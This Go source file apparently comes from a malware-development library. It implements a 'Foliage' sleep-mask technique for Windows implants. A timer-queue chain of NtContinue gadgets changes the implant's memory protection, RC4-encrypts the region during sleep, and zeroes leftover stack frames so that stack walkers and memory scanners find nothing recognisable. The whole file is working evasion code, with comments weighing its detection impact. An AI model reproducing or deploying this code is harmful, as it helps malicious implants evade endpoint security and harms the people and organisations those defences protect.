//go:build windows && amd64

package sleepmask

import (
	"context"
	"errors"
	"fmt"
	"runtime"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// FoliageStrategy is the L3 strategy: Ekko plus a stack-scrub gadget
// inserted between the encrypt and wait steps. Before the pool thread
// blocks in WaitForSingleObjectEx, it calls ntdll!memset to zero out
// our own chain's "already-used" shadow frames (gadgets 0 and 1, plus
// the padding region between them). A stack walker that inspects the
// pool thread during the wait then sees zeros above Rsp where the VP
// and SF032 frames would otherwise have left recognizable residue.
//
// Not a full Foliage port: the real Foliage technique (Austin Hudson,
// DeepSleep-style) rewrites the stack with FAKE return frames pointing
// into legitimate KERNEL32/ntdll code so the walk completes and looks
// like normal Windows activity. This is the lighter version — residue
// is zeroed rather than forged. Detection impact: walkers that only
// collect "bytes above Rsp" see nothing; walkers that unwind via
// function-table metadata terminate at the current WaitForSingleObjectEx
// frame (same as Ekko).
//
// Constraints inherit from EkkoStrategy: windows+amd64 only, RC4 cipher,
// single region, runtime.LockOSThread during Cycle, not safe for
// concurrent invocation.
type FoliageStrategy struct {
	// ScrubBytes lets the caller bump/shrink the memset range. 0 uses
	// the default (first two gadget shadow frames + padding = 0x4000).
	// Values above foliageMaxSafeScrub are silently clamped — going
	// beyond zeros the gadget-2 memset's own return address.
	ScrubBytes uintptr
}

// foliageMaxSafeScrub is the largest memset range the gadget 2 memset
// call can write without clobbering its own saved-rdi + return address,
// which live at [Rsp-8] and [Rsp] of gadget 2 (= scratch + 0x6000 / 0x6008).
// The memset starts at ekkoShadowOffset = 0x2000, so the max range that
// stays strictly below the gadget-2 frame is 2 * ekkoShadowStride = 0x4000.
// Going past that (e.g. 3 * stride) zeros out the memset's own return
// path → AV on the pool thread.
const foliageMaxSafeScrub = 2 * ekkoShadowStride

// foliageDefaultScrubBytes is the default ScrubBytes (covers gadgets 0
// and 1 — the two gadgets that completed before memset ran).
const foliageDefaultScrubBytes = foliageMaxSafeScrub

func (s *FoliageStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	if _, ok := cipher.(*RC4Cipher); !ok {
		return fmt.Errorf("sleepmask/foliage: requires *RC4Cipher cipher, got %T", cipher)
	}
	if len(regions) != 1 {
		return errors.New("sleepmask/foliage: MVP supports exactly one region")
	}
	region := regions[0]

	scrubBytes := s.ScrubBytes
	if scrubBytes == 0 {
		scrubBytes = foliageDefaultScrubBytes
	}
	if scrubBytes > foliageMaxSafeScrub {
		scrubBytes = foliageMaxSafeScrub
	}

	if api.ProcMemset.Addr() == 0 {
		return errors.New("sleepmask/foliage: ntdll!memset not found")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hCompletion, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/foliage: CreateEvent completion: %w", err)
	}
	defer windows.CloseHandle(hCompletion)
	hDummy, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/foliage: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)

	// Globals for the asm resume stub — shared with Ekko since the
	// stub only reads them.
	ekkoResumeEvent = uintptr(hCompletion)
	ekkoProcSetEvent = api.ProcSetEvent.Addr()
	ekkoProcExitThread = api.ProcExitThread.Addr()

	layout, err := newEkkoLayout()
	if err != nil {
		return err
	}
	defer layout.free()

	api.ProcRtlCaptureContext.Call(uintptr(unsafe.Pointer(layout.ctxMain)))

	var origProtect uint32
	if err := layout.buildChain(foliageGadgets(layout, region, d, hDummy, &origProtect, scrubBytes), region, key); err != nil {
		return err
	}

	r1, _, lastErr := api.ProcCreateTimerQueue.Call()
	if r1 == 0 {
		return fmt.Errorf("sleepmask/foliage: CreateTimerQueue: %w", lastErr)
	}
	hQueue := windows.Handle(r1)

	ntContinueAddr := api.ProcNtContinue.Addr()
	delayMs := uint32(d / time.Millisecond)

	var hTimer windows.Handle
	rc, _, cErr := api.ProcCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hTimer)),
		uintptr(hQueue),
		ntContinueAddr,
		uintptr(unsafe.Pointer(layout.ctxs[0])),
		0, // fire immediately
		0, // one-shot
		0, // WT_EXECUTEDEFAULT
	)
	if rc == 0 {
		return fmt.Errorf("sleepmask/foliage: CreateTimerQueueTimer: %w", cErr)
	}

	watchdog := uint32(delayMs + 5000)
	api.ProcWaitForSingleObject.Call(uintptr(hCompletion), uintptr(watchdog))

	api.ProcDeleteTimerQueueEx.Call(uintptr(hQueue), 0)

	runtime.KeepAlive(key)

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}

// foliageGadgets returns the 7-gadget list for the Foliage chain:
// VirtualProtect(RW) → SF032 encrypt → memset scrub → WFSE wait →
// SF032 decrypt → VirtualProtect(RX) → resumeStub.
//
// Gadget 2 (scrub) is the only addition vs EkkoStrategy. It calls
// ntdll!memset rather than RtlFillMemory: Windows' exported
// RtlFillMemory is the memset() implementation, so calling it with
// the documented RtlFillMemory(dest, length, fill) arg order crashes
// because the real function expects memset's (dest, c, count).
func foliageGadgets(l *ekkoLayout, region Region, d time.Duration, hDummy windows.Handle, origProtectPtr *uint32, scrubBytes uintptr) []chainGadget {
	return []chainGadget{
		{rip: api.ProcVirtualProtect.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(region.Addr)
			c.Rdx = uint64(region.Size)
			c.R8 = uint64(windows.PAGE_READWRITE)
			c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
		}},
		{rip: api.ProcSystemFunction032.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(l.ustrDataPool())
			c.Rdx = uint64(l.ustrKeyPool())
		}},
		{rip: api.ProcMemset.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(l.scratch + ekkoShadowOffset)
			c.Rdx = 0 // fill byte (memset's c arg)
			c.R8 = uint64(scrubBytes)
		}},
		{rip: api.ProcWaitForSingleObjectEx.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(hDummy)
			c.Rdx = uint64(d / time.Millisecond)
			c.R8 = 0
		}},
		{rip: api.ProcSystemFunction032.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(l.ustrDataPool())
			c.Rdx = uint64(l.ustrKeyPool())
		}},
		{rip: api.ProcVirtualProtect.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(region.Addr)
			c.Rdx = uint64(region.Size)
			c.R8 = uint64(windows.PAGE_EXECUTE_READ)
			c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
		}},
		{rip: resumeStubAddr(), tune: nil},
	}
}
